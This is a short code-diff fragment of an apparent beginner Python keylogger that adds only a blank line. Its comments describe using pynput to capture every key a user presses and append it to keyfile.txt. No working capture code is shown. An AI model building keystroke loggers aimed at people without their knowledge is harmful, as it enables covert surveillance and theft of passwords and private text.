@@ -3,6 +3,7 @@
 #Make sure to install pynput first (pip install pynput)
 #Let's first import pynput which include keyboard module which can be used to capture key events from user)
 
+
 from pynput import keyboard 
 
 #We are going to firrst create the function keyPressed which is going to take every key and append it to the keyfile.txt
